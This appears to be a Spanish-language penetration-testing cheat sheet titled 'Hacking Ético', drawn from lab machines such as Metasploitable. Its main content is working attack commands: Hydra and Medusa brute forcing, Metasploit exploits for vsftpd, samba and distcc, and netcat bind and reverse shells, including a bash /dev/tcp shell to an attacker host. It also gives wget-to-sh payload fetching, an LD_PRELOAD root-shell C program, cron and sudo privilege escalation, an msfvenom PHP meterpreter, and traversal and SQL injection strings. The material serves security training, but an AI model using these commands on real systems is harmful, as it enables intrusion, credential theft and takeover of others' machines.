<h1 style="text-align:center;font-size:40px;"> HACKING ÉTICO</h1>

## Configuración

### idioma consola

```sh
sudo dpkg-reconfigure locales
```

### fecha

```sh
sudo timedatectl set-timezone europe/madrid
sudo apt install asciinema byobu
```

## RECONOCIMIENTO

```sh
host -t ns zonetransfer.me # obtener dns
host -la zonetransfer.me nsztm1.digi.ninja.
host -la internal.zonetransfer.me intns1.zonetransfer.me.
host cisco1.internal.zonetransfer.me

dnsrecon -d zonetransfer.me -t axfr
dnsrecon -d zonetransfer.me -t brt -D nombres.txt -v
dnsrecon -d zonetransfer.me -t std
dnsrecon -d zonetransfer.me -t brt -D /usr/share/wordlists/metasploit/namelist.txt  -v
```

### Herramientas

#### DNS

[dnsdumpster](https://dnsdumpster.com/)

[viewdns](https://viewdns.info)

#### correo

[haveibeenpwned ](https://haveibeenpwned.com) --> Comprobar filtracion de correo

#### Imagenes

[tineye](https://tineye.com)
[yandex](https://yandex.com)

#### WEB

[netcraft](https://www.netcraft.com) <-- Información

[whatsmyname](https://whatsmyname.app)

[BREACHDIRECTORY.ORG](https://breachdirectory.org)

#### [shodan.io](https://www.shodan.io)

> motor de búsqueda equipos conectados a Internet

##### Busquedas

```sh
default password
port:161 country
```

##### Terminal

```sh
torsocks
```

[web time machine](https://wayback.archive.org/)

#### [OSINT](https://osintframework.com)

#### Spiderfoot

```sh
spiderfoot -l
spiderfoot -l 127.0.0.1:5001
```

#### Nombres

[whatsmyname](https://whatsmyname.app)
[namechackup](https://www.namecheap.com)


## BUGBOUNTY

[bugcrowd](https://www.bugcrowd.com)
[hackerone](https://www.hackerone.com)
[intigriti](https://www.intigriti.com)


## NMAP

### Escaneo de red
```sh
sudo nmap -sn 192.168.1.0/24
sudo nmap -sn 192.168.1.0/24 --send
sudo nmap -sn 192.168.1.0/24 --send-ip
sudo nmap -sn {TARGET} --reason --send-ip
```

### Puertos
```sh
sudo nmap -sn -PS22,80,443,60666 {TARGET} --reason --send-ip
sudo nmap -sn -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -T4 {TARGET}
```

### Escaneo

```sh
sudo nmap -n -PN -sS {TARGET}
sudo nmap -n -PN -sS -p 21,22,23,25-100,443 {TARGET}
sudo nmap -n -PN -sS -p- {TARGET}
sudo nmap -n -PN -sS -sV -p 21,22,23,500 X {TARGET} 
sudo nmap -n -PN -sS -sV -O -p- {TARGET} # todos los puertos
sudo nmap -n -PN -sS -sV -O -p- {TARGET} -oA Metasploitable -v # exportar resultados

sudo nmap -n -PN -A -T4 -p- {TARGET} # -A = -sS -sV -O
```

### Scripts

```sh
ll /usr/share/nmap/scripts # carpeta de scripts
sudo nmap -n -PN -sS -sV -sC -O -p- {TARGET} -oA Metasploitable2 -v
sudo nmap -n -PN --script ftp-vsftpd-backdor.nse -p 21  {TARGET}
```

#### ftp

```sh
sudo nmap -n -PN --script /usr/share/nmap/scripts/ftp-vsftpd-backdor.nse -p 21  {TARGET}
sudo nmap -n -PN --script ftp-vsftpd-backdoor -p 21 {TARGET}
sudo nmap -n -PN --script ftp-vsftpd-backdoor --script-args ftp-vsftpd-backdoor.cmd  -p 21 {TARGET}
sudo nmap -n -PN --script ftp-vsftpd-backdoor --script-args ftp-vsftpd-backdoor.cmd='cat /etc/passwd'  -p 21 {TARGET}
```

#### ssh

```sh
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|   2048 5656240f211ddea72bae61b1243de8f3 (RSA)
```

```sh
# scripts de NMAP
ll /usr/share/nmap/scripts | grep ssh
# Enumeración
sudo nmap -n -PN --script ssh2-enum-algos.nse {TARGET}

# Métodos de a utenticación
sudo nmap -n -PN --script ssh-auth-methods.nse {TARGET}
```

#### SMTP

```sh
ll /usr/share/nmap/scripts/ | grep smtp

sudo nmap -n -PN -p 25 --script smtp-commands.nse {TARGET}
```

[netcat](#netcat)

```sh
sudo nmap -n -PN -p 25 --script smtp-enum-users.nse --script-args userdb=users.txt {TARGET}

# Si no funciona:
apt install -y smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t {TARGET}
```

Open relay

```sh
sudo nmap -n -PN -p 25 --script smtp-open-relay {TARGET}
```

## Metasploitable

```sh
msfconsole
msf6 > 
search *
use {result}
info
show options
set VAR {valor}
exploit # '-O' para exportar
```

### Enumeración de usuarios por ssh

```sh
sudo msfconsole
msf6 > 
search ssh enum
use auxiliary/scanner/ssh/ssh_enumusers # <==> use {numero}
info
show options
set RHOST {TARGET}
set USER_FILE {wordlists}
exploit
```

### ftp scan

```sh
# Scan
msf6 > 
use auxiliary/scanner/ftp/ftp_version

#exploit reverse shell
use exploit/unix/ftp/vsftpd_234_backdoor
```

### SMTP

```sh
# Enum
msf6 > 
use auxiliary/scanner/smtp/smtp_enum

#smtp relay
use scanner/smtp/smtp_relay

```

## fuerza bruta

### Metasploit

```sh
msf6 > 
use scanner/ssh/ssh_login
```

### Medusa

```sh
medusa -h {TARGET} -u {USER} -P {password_file.txt} -M ssh -t 5 -e ns
medusa -h {TARGET} -U {USER_LIST} -P {password_file.txt} -M ssh -t 5 -e ns
```

### Hydra

```sh
sudo hydra -l USER -P passwords.txt -I -V -t 4 {PROTOCOL}://{TARGET}:{PORT} # -O salida.txt
sudo hydra -L USERS -P passwords.txt -I -V -t 4 {PORT} {TARGET} {PROTOCOL}

sudo hydra -l msfadmin -P 2020-200_most_used_passwords.txt -o hydra_metasploitable.txt -t 4 ftp://{TARGET}:21
```

<a name='Netcat'/>

## Netcat

Verificar correos electronicos

```sh
nc {TARGET} 25
EHLO kali
250-metasploitable.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY root
252 2.0.0 root
VRFY user 
252 2.0.0 user
VRFY test
550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
```

## netbios scan

```sh
nbtscan 192.168.56.101-254

# con NMAP
sudo nmap -n -PN -p 139,445 -sV --script smb-protocols {TARGET}
sudo nmap -n -PN -p 139,445 -sV --script smb-os-discovery {TARGET}
sudo nmap -n -PN -p 139,445 -sV --script smb-enum-shares {TARGET}

smbclient //{TARGET}/ -N
```

### enumeración

```sh
enum4linux 192.168.56.107 -v
```

## NESSUS

### Instalación

#### DOCKER 

```sh
# DOCKER
docker pull tenableofficial/nessus
docker run -d -p 8834:8834 --name nessus tenableofficial/nessus
https://localhost:8834
```

#### VM

```sh
cat /etc/netplan/00-installer-config.yaml 
```

```yaml
# This is the network config written by 'subiquity'
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: true
```

```sh
sudo netplan apply
sudo apt -y update
sudo apt -y full-upgrade

curl --request GET \
  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.4.2-ubuntu1404_amd64.deb' \
  --output 'Nessus-10.4.2-ubuntu1404_amd64.deb'
sudo dpkg -i Nessus-10.4.2-ubuntu1404_amd64.deb
```

[actualizaciones](https://www.tenable.com/downloads/nessus?loginAttempted=true)

#### Esentials

[Registro](https://es-la.tenable.com/products/nessus/nessus-essentials)

### Escaneo

Nuevo escaneo > basico > 

## Reverse Shell

### NETCAT

```sh
nc -v {TARGET} {PORT} # establecer tuberia de datos
nc -vz {TARGET} {PORT} # -z conectarse

nc -vC  {TARGET} {PORT} # Consola

❯ nc -vC www.ciudadwireless.com 80
Connection to www.ciudadwireless.com (178.33.118.157) 80 port [tcp/http] succeeded!
GET / HTTP/1.1
Host: www.ciudadwireless.com

nc -nlvp 4444 # Abrir servidor de escucha // -n no resolucion DSN ; -l listen ; -v infromacion ; -p puerto
nc -nv {TARGET ↖} {PORT ↖} # Conectarse

# Transferencia de archivos
nc -nlvp 4444 > file # abrimos servidor para enviar
nc -nv {TARGET ↖} 4444 < file # Conectamos y enviamos el contenido de ese fichero

nc -nlvp 4444 < file # abrimos servidor para recivir
nc -nv {TARGET} 4444 > file

# Terminal
nc -nlvp 4444 -e /bin/bash # abre servidor para conectarse a su bash

nc -nvlp 80 # escucha en el puerto 80
nc -nv {TARGET} 80 -e /bin/bash # Victoma se conecta al y envia una terminal

apt install ncat
ncat -vz {TARGET} {PORT}
```

### bindshell

```sh
❯ sudo nmap -n -PN -sS -sV {TARGET}
1524/tcp open  bindshell   Metasploitable root shell

nc -v {TARGET} 1524
```

### Rlogin

```sh
apt install rsh-client
rlogin -l root {TARGET}
```

### Terminal Basica --> Terminal Interactiva

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl + Z para segundo plano
stty raw -echo;fg;ls; export SHELL=/bin/bash;export TERM=screen # traer tarea
```

Con metasploit ( meterpreter )

```sh
msf6 > 
use exploit/unix/ftp/vsftpd_234_backdoor
[ Ctrl + Z ] 
sessions -u 1 # sessions -l 
sessions -i 2
```

```sh
cp /usr/share/webshells/php/php-reverse-shell.php . # cambiar ip a atacante y puerto para netcat 8000
meterpreter > upload ./Escritorio/php-reverse-shell.php /var/www/phpshell.php
meterpreter > chmod 644 /var/www/phpshell.php
nc -nvlp 8000
http://{TARGET}/phpshell.php
```

### Reverse Netcat

```sh
msf6 > 
use multi/samba/usermap_script
```



## Payloads

**Inline/stageless/single** 
  - utiliza la vulnerabilidad y ejecuta todo el codigo en la victima

**Staged**
  - No se envia de golpe, se envia por fases
  1) Pone en contacto con la victima (Stager/dropper)
  2) stage

### Msfvenom

```sh
msfvenom -l payloads # Listar payloads
msfvenom -l payloads | grep -i unix | grep -i meterpreter
```

### Reverse Msfconsole

```sh
msf6 > 
use exploit/unix/misc/distcc_exec
show payloads
set payload 5
```

## Obtener datos teniendo acceso

```sh
# Conocer SO
cat /etc/*-release

# Kernel
uname -a
cat /proc/version

# Tiempo sin reinciarse
uptime

# Paquetes
dpkg -l

# Proesos
ps
ps aux

# Tareas programas
crontab -l
ls /etc/cron

# red
ip route 
netstat
iptables -L -n

# metasploit 
msf6 > 
use post/multi/recon/local_exploit_suggester

use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
set payload payload/linux/x86/meterpreter_reverse_tcp
```

### PayloadsAllTheThings

[Repo](https://github.com/swisskyrepo/PayloadsAllTheThings)  

[web](https://swisskyrepo.github.io/PayloadsAllTheThings/)

#### linpeas

```sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh  # Host

python -m http.server 8000 # Host
wget http://{HOST}:{PORT}/linpeas.sh | sh # Victima
```

[gtfobins](https://gtfobins.github.io)

## Escalar privililegios

### Apps

```sh
sudo -l # comprobar que apps van con sudo
```

less

```sh
sudo less /etc/profile
!/bin/bash
```

more

```sh
sudo more /etc/profile
!/bin/bash
```

vim

```sh
sudo vim -c ':!/bin/bash'
```

apache

```sh
sudo apache2 -f /etc/shadow
```

```sh
hashid hash.txt
hashcat -h | grep -i sha512
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/...
```

### [LD_PRELOAD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ld_preload-and-nopasswd)

```sh
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

```sh
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

### Crontab

`crontab -l` `cat /etc/crontab`

```sh
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root overwrite.sh
```

`overwrite.sh`

```sh
#1
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```sh
/tmp/rootbash -p
```

```sh
#2
"bash -i >& /dev/tcp/{ATACANTE}/4444 0>&1 "
```

## Web

```sh
whatweb http://{TARGET}
whatweb -v http://{TARGET}
```

### Escanear

```sh
dirb http://{TARGET}
```

#### ffuf

> maquina academy

*dirbuster, dirb, wffuz*

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://{TARGET}/FUZZ
```

> Se descubre http://{TARGET}/academy
> Reverse-shell con php-reverse-shell.php al subir un archivo.

```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST={ATACANTE} LPORT={P-ATACANTE} -f raw | tee academy-meterpreter.php
```

```sh
msf6> use exploit/multi/handler
run -j -z
```

> subir `linpeas.sh`

### Burpsuite

#### directory traversal

```sh
../../../../../../../../../etc/passwd
....//....//....//....//....//....//etc/passwd
```

#### SQL injection

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
https://{TARGET}/products?category=Gifts'--
-- = 
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

https://{TARGET}//products?category=Gifts'+OR+1=1--
-- =
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

username=administrator'--&password=sada
```